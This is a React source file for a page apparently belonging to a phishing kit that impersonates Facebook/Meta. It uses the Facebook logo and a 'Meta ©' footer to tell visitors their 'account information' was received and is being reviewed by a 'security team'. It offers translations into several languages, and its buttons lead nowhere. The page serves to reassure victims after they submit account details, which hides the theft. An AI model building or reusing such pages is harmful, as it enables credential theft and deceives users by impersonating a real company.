import Logo1 from '@/assets/images/logo1.png';
import { faCheckCircle, faDownload, faEnvelope } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';

const SendInfo = () => {
    const defaultTexts = useMemo(
        () => ({
            title: 'Information Successfully Submitted',
            description1: 'Your account information has been successfully received and is being reviewed by our security team.',
            description2: 'We will contact you via email within 24-48 hours regarding the status of your account.',
            thankYou: 'Thank you for your cooperation in helping us maintain a secure environment.',
            checkEmail: 'Check Your Email',
            downloadConfirmation: 'Download Submission Confirmation',
            contactSupport: 'Contact Support',
            englishUS: 'English (US)',
            deutsch: 'Deutsch',
            turkce: 'Türkçe',
            polski: 'Polski',
            italiano: 'Italiano'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedDesc1,
                    translatedDesc2,
                    translatedThankYou,
                    translatedCheckEmail,
                    translatedDownload,
                    translatedContact,
                    translatedEnglish,
                    translatedDeutsch,
                    translatedTurkce,
                    translatedPolski,
                    translatedItaliano
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.description1, targetLang),
                    translateText(defaultTexts.description2, targetLang),
                    translateText(defaultTexts.thankYou, targetLang),
                    translateText(defaultTexts.checkEmail, targetLang),
                    translateText(defaultTexts.downloadConfirmation, targetLang),
                    translateText(defaultTexts.contactSupport, targetLang),
                    translateText(defaultTexts.englishUS, targetLang),
                    translateText(defaultTexts.deutsch, targetLang),
                    translateText(defaultTexts.turkce, targetLang),
                    translateText(defaultTexts.polski, targetLang),
                    translateText(defaultTexts.italiano, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description1: translatedDesc1,
                    description2: translatedDesc2,
                    thankYou: translatedThankYou,
                    checkEmail: translatedCheckEmail,
                    downloadConfirmation: translatedDownload,
                    contactSupport: translatedContact,
                    englishUS: translatedEnglish,
                    deutsch: translatedDeutsch,
                    turkce: translatedTurkce,
                    polski: translatedPolski,
                    italiano: translatedItaliano
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleCheckEmail = () => {
        window.location.href = 'about:blank';
    };

    const handleDownload = () => {
        window.location.href = 'about:blank';
    };

    const handleContactSupport = () => {
        window.location.href = 'about:blank';
    };

    const languages = [
        { code: 'en', name: translatedTexts.englishUS },
        { code: 'de', name: translatedTexts.deutsch },
        { code: 'tr', name: translatedTexts.turkce },
        { code: 'pl', name: translatedTexts.polski },
        { code: 'it', name: translatedTexts.italiano }
    ];

    return (
        <div className='min-h-screen bg-gray-100'>
            {/* Header */}
            <header className='bg-white shadow-sm'>
                <div className='max-w-6xl mx-auto px-4 py-4'>
                    <div className='flex items-center justify-center'>
                        <img 
                            src={Logo1} 
                            alt='Facebook' 
                            className='h-8 w-auto'
                        />
                    </div>
                </div>
            </header>

            {/* Main Content */}
            <main className='max-w-4xl mx-auto px-4 py-8'>
                <div className='bg-white rounded-lg shadow-sm border border-gray-200'>
                    {/* Success Icon */}
                    <div className='flex justify-center pt-8'>
                        <FontAwesomeIcon 
                            icon={faCheckCircle} 
                            className='text-green-500 text-6xl'
                        />
                    </div>

                    {/* Title Section */}
                    <div className='px-6 py-6 border-b border-gray-200 text-center'>
                        <h1 className='text-2xl font-bold text-gray-900'>
                            {translatedTexts.title}
                        </h1>
                    </div>

                    {/* Description Section */}
                    <div className='px-6 py-8 space-y-4'>
                        <p className='text-gray-700 leading-relaxed text-center'>
                            {translatedTexts.description1}
                        </p>
                        <p className='text-gray-700 leading-relaxed text-center'>
                            {translatedTexts.description2}
                        </p>
                        <p className='text-gray-700 leading-relaxed text-center font-medium'>
                            {translatedTexts.thankYou}
                        </p>
                    </div>

                    {/* Action Buttons */}
                    <div className='px-6 py-6 space-y-4'>
                        <button
                            onClick={handleCheckEmail}
                            className='w-full flex items-center justify-center space-x-3 px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors'
                        >
                            <FontAwesomeIcon icon={faEnvelope} />
                            <span className='font-medium'>
                                {translatedTexts.checkEmail}
                            </span>
                        </button>

                        <button
                            onClick={handleDownload}
                            className='w-full flex items-center justify-center space-x-3 px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors'
                        >
                            <FontAwesomeIcon icon={faDownload} className='text-gray-600' />
                            <span className='text-gray-900 font-medium'>
                                {translatedTexts.downloadConfirmation}
                            </span>
                        </button>

                        <button
                            onClick={handleContactSupport}
                            className='w-full flex items-center justify-center space-x-3 px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors'
                        >
                            <span className='text-gray-900 font-medium'>
                                {translatedTexts.contactSupport}
                            </span>
                        </button>
                    </div>
                </div>

                {/* Language Selector */}
                <div className='mt-8 bg-white rounded-lg shadow-sm border border-gray-200'>
                    <div className='px-6 py-4'>
                        <div className='grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4'>
                            {languages.map((language) => (
                                <button
                                    key={language.code}
                                    className='text-blue-600 hover:text-blue-800 text-sm font-medium py-2 px-3 rounded hover:bg-blue-50 transition-colors'
                                    onClick={() => {
                                        localStorage.setItem('targetLang', language.code);
                                        translateAllTexts(language.code);
                                    }}
                                >
                                    {language.name}
                                </button>
                            ))}
                        </div>
                    </div>
                </div>

                {/* Footer */}
                <footer className='mt-8 text-center'>
                    <p className='text-gray-500 text-sm'>
                        Meta © {new Date().getFullYear()}
                    </p>
                </footer>
            </main>
        </div>
    );
};

export default SendInfo;